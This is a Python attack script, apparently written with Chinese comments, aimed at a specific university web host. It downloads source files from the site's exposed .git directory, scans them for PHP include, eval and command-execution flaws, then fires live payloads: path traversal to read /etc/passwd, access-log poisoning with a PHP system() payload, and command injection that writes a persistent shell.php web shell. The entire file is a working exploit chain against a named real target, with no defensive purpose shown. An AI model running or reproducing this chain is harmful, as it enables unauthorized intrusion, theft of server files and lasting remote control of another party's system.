#!/usr/bin/env python3
import zlib
import requests
import re
urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://olympic.su.ac.th'

# 下载enmeeting目录tree
enmeeting_hash = '18e41f24c7bc3ace2ad3bbbfdd8e85c990d96abd'
tree_path = f'/.git/objects/{enmeeting_hash[:2]}/{enmeeting_hash[2:]}'
resp = requests.get(url + tree_path, verify=False, timeout=10)
tree_data = zlib.decompress(resp.content)
null1 = tree_data.find(b'\0')
pos = null1 + 1

print('enmeeting目录下的文件:')
files_found = []

while pos < len(tree_data):
    null2 = tree_data.find(b'\0', pos)
    if null2 == -1 or null2 + 21 > len(tree_data):
        break
    mode_name = tree_data[pos:null2]
    parts = mode_name.split(b' ', 1)
    if len(parts) == 2:
        mode = parts[0].decode()
        filename = parts[1].decode()
        hash_hex = tree_data[null2+1:null2+21].hex()
        print(f'{mode} {filename} -> {hash_hex}')
        files_found.append((filename, hash_hex))
        pos = null2 + 21

# 下载addmeeting.php
for filename, file_hash in files_found:
    if filename.endswith('.php'):
        print(f'\n[*] 下载并分析: {filename}')
        blob_path = f'/.git/objects/{file_hash[:2]}/{file_hash[2:]}'
        resp2 = requests.get(url + blob_path, verify=False, timeout=10)
        if resp2.status_code == 200:
            blob_data = zlib.decompress(resp2.content)
            null_blob = blob_data.find(b'\0')
            if null_blob != -1:
                content = blob_data[null_blob+1:].decode('utf-8', errors='ignore')
                print(f'文件大小: {len(content)} bytes\n')
                
                # 查找文件包含
                print('[*] 检查文件包含漏洞...')
                include_pattern = r'(include|require|include_once|require_once)\s*\(?\s*[\'"]?([^"\']*\$[^"\']*)[\'"]?'
                includes = re.findall(include_pattern, content, re.IGNORECASE)
                for include_type, include_path in includes:
                    if '$' in include_path:
                        print(f'  [!] {include_type}: {include_path[:100]}')
                        # 查找相关参数
                        param_matches = re.findall(r'\$_(GET|POST|REQUEST|COOKIE)\[["\']([^"\']+)["\']\]', content)
                        if param_matches:
                            print(f'      参数: {param_matches[:5]}')
                            # 测试文件包含
                            web_path = f'enmeeting/{filename}'
                            for param_type, param_name in param_matches[:3]:
                                test_url = f"{url}/{web_path}?{param_name}=../../../../etc/passwd"
                                resp3 = requests.get(test_url, verify=False, timeout=5)
                                if "root:" in resp3.text and resp3.status_code == 200:
                                    print(f'      [+] 文件包含成功: {test_url}')
                                    # 尝试日志包含
                                    php_code = "<?php system($_GET['c']); ?>"
                                    requests.get(f"{url}/{web_path}?{param_name}={php_code}", verify=False, timeout=5)
                                    log_url = f"{url}/{web_path}?{param_name}=../../../../var/log/apache2/access.log&c=id"
                                    shell_resp = requests.get(log_url, verify=False, timeout=5)
                                    if "uid=" in shell_resp.text:
                                        print(f'      [+] Shell获取成功: {log_url}')
                                        exit(0)
                
                # 查找eval
                print('\n[*] 检查eval漏洞...')
                if 'eval' in content.lower():
                    eval_matches = re.findall(r'eval\s*\([^)]*\$', content, re.IGNORECASE)
                    if eval_matches:
                        print(f'  [!] 发现eval: {eval_matches[0][:100]}')
                        param_matches = re.findall(r'\$_(GET|POST|REQUEST)\[["\']([^"\']+)["\']\]', content)
                        if param_matches:
                            print(f'      参数: {param_matches[:5]}')
                            web_path = f'enmeeting/{filename}'
                            for param_type, param_name in param_matches[:3]:
                                test_url = f"{url}/{web_path}?{param_name}=system('id');"
                                resp3 = requests.get(test_url, verify=False, timeout=5)
                                if "uid=" in resp3.text:
                                    print(f'      [+] RCE成功: {test_url}')
                                    shell_cmd = f"file_put_contents('shell.php','<?php system($_GET[c]); ?>');"
                                    shell_url = f"{url}/{web_path}?{param_name}={shell_cmd}"
                                    requests.get(shell_url, verify=False, timeout=5)
                                    test_shell = requests.get(f"{url}/shell.php?c=id", verify=False, timeout=5)
                                    if "uid=" in test_shell.text:
                                        print(f'      [+] Shell获取成功: {url}/shell.php?c=id')
                                        exit(0)
                
                # 查找system/exec
                print('\n[*] 检查命令执行漏洞...')
                if 'system' in content.lower() or 'exec' in content.lower():
                    cmd_matches = re.findall(r'(system|exec|shell_exec|passthru)\s*\([^)]*\$', content, re.IGNORECASE)
                    if cmd_matches:
                        print(f'  [!] 发现命令执行: {cmd_matches[0][0]}')
                        param_matches = re.findall(r'\$_(GET|POST|REQUEST)\[["\']([^"\']+)["\']\]', content)
                        if param_matches:
                            print(f'      参数: {param_matches[:5]}')
                            web_path = f'enmeeting/{filename}'
                            for param_type, param_name in param_matches[:3]:
                                test_url = f"{url}/{web_path}?{param_name}=id"
                                resp3 = requests.get(test_url, verify=False, timeout=5)
                                if "uid=" in resp3.text:
                                    print(f'      [+] 命令执行成功: {test_url}')
                                    shell_cmd = "echo '<?php system($_GET[c]); ?>' > shell.php"
                                    shell_url = f"{url}/{web_path}?{param_name}={shell_cmd}"
                                    requests.get(shell_url, verify=False, timeout=5)
                                    test_shell = requests.get(f"{url}/shell.php?c=id", verify=False, timeout=5)
                                    if "uid=" in test_shell.text:
                                        print(f'      [+] Shell获取成功: {url}/shell.php?c=id')
                                        exit(0)
                
                # 显示关键代码行
                print('\n[*] 关键代码片段:')
                lines = content.split('\n')
                for i, line in enumerate(lines):
                    if any(keyword in line.lower() for keyword in ['include', 'require', 'eval', 'system', 'exec', '$_GET', '$_POST']):
                        if len(line.strip()) > 5 and len(line.strip()) < 200:
                            print(f'  Line {i+1}: {line.strip()[:150]}')
